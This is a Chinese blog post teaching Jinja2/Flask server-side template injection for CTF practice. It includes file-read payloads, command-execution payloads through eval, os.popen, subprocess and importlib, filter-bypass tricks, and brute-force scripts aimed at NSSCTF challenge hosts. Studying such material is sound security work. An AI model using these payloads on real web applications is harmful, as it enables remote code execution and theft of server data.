---
title: SSTI 漏洞
description: 学习一下SSTI漏洞
date: 2026-07-14 08:48:45
updated: 2026-07-14 08:48:45
image: /2026/SSTI 漏洞/cover.jpg
categories: [技术]
---

## SSTI 漏洞介绍

SSTI（Server-Side Template Injection）是一种服务器端模板注入漏洞，发生在应用程序使用模板引擎渲染用户输入时未能正确过滤或转义用户提供的内容。比如在`python的flask`、`php的tp`、`java的spring`等框架中都可能存在。

## Jinja2 

python 常见的模板引擎主要有 Jinja2 、Mako 、Tornado 、Django Template 等，这里先用 Jinja2 模版进行学习。

### 1.  Python  继承关系和魔术方法

在 Python 中，一切类的父子关系的顶端都是 object 类。这里用一个例子学习。

```python
class A:pass
class B(A):pass
class C(B):pass
class D(B):pass
c = C()

# 在这个例子中 B 继承 A 类，C 和 D 继承 B 类。

# 魔术方法
__class__  查找当前属性的所属对象
__base__  沿着父子类关系向上查找一个
__bases__  查找当前类的所有父类(有些类同时继承多个类)
__mro__  查找当前类的所有继承的父类
__subclasses__()  查找父类下的所有子类
__init__  初始化对象方法，同时如果返回wrapper，那么不是普通 Python 函数，一般没有 __globals__
__globals__  以字典形式返回当前对象全部全局变量
__builtins__  提供对Python的所有内置标识符的直接访问
popen()  用于启动一个外部进程并读取它输出的方法，可以用read()读取

```



### 2.  Python  Flask  介绍

这里主要介绍一下 Flask 框架如何通过 `request` 对象。读取 Post 和 Get 中的参数。

读取 Get  ，对于 `url?id=999` 去读取参数 id ，可以使用 `request.args.get('id')` 或者 `request.args['id']` 。

读取 Post ，对于 form 表单的形式，`username = admin` 可以使用 `request.form.get('username')` ；对于 json 的形式，`{"username":"admin",}` 可以用 `data = request.json   username = data['username']`。



### 3.  Jinja2  模版介绍

Jinja2 模版基础语法有三种。

| 符号    | 作用            |
| :------ | :-------------- |
| `{{ }}` | 输出变量/表达式 |
| `{% %}` | 执行控制语句    |
| `{# #}` | 注释            |

对于属性访问，Jinja2 支持 `user.name` 、 `user['name']` 、`getattr(user,"name")` 这些方式。

对于过滤器，这里主要介绍一些 SSTI 中可能用到的。

Jinja2 **过滤器（filter）** 是对模板变量进行处理的一种机制。

```python
# attr() 是 Jinja2 里一个用于动态获取对象属性的过滤器。
{{user.name}}  等价  {{user|attr('name')}}

# join 把列表里的多个字符串，用指定的分隔符拼成一个字符串。在 Jinja2 中，对字典进行 join 操作会提取所有的 Key 并拼成字符串。
{{ ["a","b","c"] | join }}  a-b-c
{{dict(oo=n,pp=i)|join}}  oopp

# count length 过滤器会计算对象的长度。
{{"name"|count}}  4

```



### 4.  SSTI  利用

#### 1.  文件读取

通过`''.__class__.__bases__[0].__subclasses__()` 查找`_frozen_importlib_external.FileLoader`类的下标，然后调用`get_data`方法，传入参数 0 和文件路径。

`{{''.__class__.__bases__[0].__subclasses__()[138]['get_data'](0,/ect/passwd")}}`



查找下标可以是用下面脚本。

```python
#!/usr/bin/env python3
"""从 subclasses 输出中找指定类的索引 — 把 dump 结果直接贴到 RAW 变量里即可"""

RAW = """\
..................."""

TARGET = "os._wrap_close"   # 改成你要找的类名，不用带 class '...' 包裹

# --- 下面不用动 ---
content = RAW.strip()

# 去掉可能的前缀（如 SSTI 回显的 "Hello "）
if not content.startswith("["):
    bracket = content.find("[")
    if bracket != -1:
        content = content[bracket:]

# 去外层 []
if content.startswith("["):
    content = content[1:]
if content.endswith("]"):
    content = content[:-1]

# 按 ", " 分割
classes = [c.strip() for c in content.split(", ")]

# 搜目标
target_full = f"class '{TARGET}'"
for i, c in enumerate(classes):
    if c == target_full:
        print(f"[+] 找到 {target_full}")
        print(f"    索引: {i}")
        print(f"    Payload: {{}}.__class__.__base__.__subclasses__()[{i}]")
        break
    elif TARGET in c:
        print(f"[+] 模糊匹配到包含 '{TARGET}' 的项:")
        print(f"    索引 {i}: {c}")
else:
    print(f"[-] 未精确匹配 '{TARGET}'，模糊搜索结果:")
    for i, c in enumerate(classes):
        if TARGET.lower() in c.lower():
            print(f"    [{i}] {c}")

```



#### 2.  命令执行

##### 1.  eval

找到含有__builtins__的类，然后通过__builtins__调用**eval**进行命令执行。

这里给一个脚本去找该类，name 值是目标 url 页面填写的表单的名字。

```python
import requests

url = "http://node5.anna.nssctf.cn:27779/level/1"

for i in range(500):

    payload = f"{{{{().__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__['__builtins__']}}}}"

    data = {
        "code": payload
    }

    print("testing:", i)

    try:
        r = requests.post(url, data=data)

        if "eval" in r.text :

            print("FOUND", i)

    except:
        pass
```



找到后，`{{().__class__.__bases__[0].__subclasses__()[134].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("env").read()')}}`



##### 2.  os

直接调用 os 模块。

`lipsum  config  url_for  get_flashed_messages` 这些一般都直接有 os 模块，可以直接调用。可以用`self.__dict__.TemplateReference__context.keys()` 去查看。

`{{lipsum.__globals__['os'].popen('env').read()}}`

在已加载 os 模块的其他子类中调用 os 模块。

```python
import requests

url = "http://node5.anna.nssctf.cn:20213/level/1"

for i in range(500):

    payload = f"{{{{().__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__}}}}"

    data = {
        "code": payload
    }

    print("testing:", i)

    try:
        r = requests.post(url, data=data)

        if "os.py" in r.text :

            print("FOUND", i)

    except:
        pass
```

`{{().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['os'].popen('env').read()}}`

##### 3.  subprocess.Popen

```python
import requests

url = "http://node5.anna.nssctf.cn:20213/level/1"

for i in range(500):

    payload = f"{{{{().__class__.__bases__[0].__subclasses__()[{i}]}}}}"

    data = {
        "code": payload
    }

    print("testing:", i)

    try:
        r = requests.post(url, data=data)

        if "subprocess.Popen" in r.text :

            print("FOUND", i)

    except:
        pass
```



`{{().__class__.__bases__[0].__subclasses__()[294]('env',shell=True,stdout=-1).communicate()[0].strip()}}`

##### 4.  importlib

```python
#!/usr/bin/env python3
"""从 subclasses 输出中找指定类的索引 — 把 dump 结果直接贴到 RAW 变量里即可"""

RAW = """"""


TARGET = "_frozen_importlib.BuiltinImporter"   # 改成你要找的类名，不用带 class '...' 包裹

# --- 下面不用动 ---
content = RAW.strip()

# 去掉可能的前缀（如 SSTI 回显的 "Hello "）
if not content.startswith("["):
    bracket = content.find("[")
    if bracket != -1:
        content = content[bracket:]

# 去外层 []
if content.startswith("["):
    content = content[1:]
if content.endswith("]"):
    content = content[:-1]

# 按 ", " 分割
classes = [c.strip() for c in content.split(", ")]

# 搜目标
target_full = f"class '{TARGET}'"
for i, c in enumerate(classes):
    if c == target_full:
        print(f"[+] 找到 {target_full}")
        print(f"    索引: {i}")
        print(f"    Payload: {{}}.__class__.__base__.__subclasses__()[{i}]")
        break
    elif TARGET in c:
        print(f"[+] 模糊匹配到包含 '{TARGET}' 的项:")
        print(f"    索引 {i}: {c}")
else:
    print(f"[-] 未精确匹配 '{TARGET}'，模糊搜索结果:")
    for i, c in enumerate(classes):
        if TARGET.lower() in c.lower():
            print(f"    [{i}] {c}")

```

`{{().__class__.__bases__[0].__subclasses__()[84]["load_module"]("os").popen('env').read()}}`



### 5.  过滤

#### 1.  `{   {`

禁了`{`，可以用`{% print %}`等价绕过。

```python
{% %}可以用来声明变量，当然也可以用于循环语句和条件语句。

{{ }}用于将表达式打印到模板输出

{# #}表示未包含在模板输出中的注释

```

EXP    `{%print lipsum.__globals__['os'].popen('env').read()%}`

#### 2.  `[  ]`

禁了`[ ]`，替换一下。

```python
dict['__builtins__']
dict.__getitem__('__builtins__')
dict.pop('__builtins__')
dict.get('__builtins__')
dict.setdefault('__builtins__')
list[0]
list.__getitem__(0)
list.pop(0)
```

EXP  `{{lipsum.__globals__.pop('os').popen('env').read()}}`

#### 3.  `'  "`

禁了`' "`，用表示`request` 绕过。

EXP

```python
1.在post注入
{{lipsum.__globals__[request.form.a1].popen(request.form.a2).read()}}
a1=os&a2=env
2.在get注入
{{lipsum.__globals__[request.args.a1].popen(request.args.a2).read()}}
url : ...?a1=os&a2=env
```

#### 4.  `_`

禁了`_`，三种方式绕过。

构造获取

```python
 (()|select|string)得到的字符串里，第 24 个字符正好就是 _ 。
 {{ ()|attr(class) }}  
 # 等同于 {{ ().__class__ }}
 
 EXP
 {% set u = (()|select|string|list).pop(24) %}{% set nss = u ~ u ~ "globals" ~ u ~ u %}{{ (lipsum|attr(nss)).os.popen('env').read() }}
    
 
```

## Node.js

## PHP

## Spring

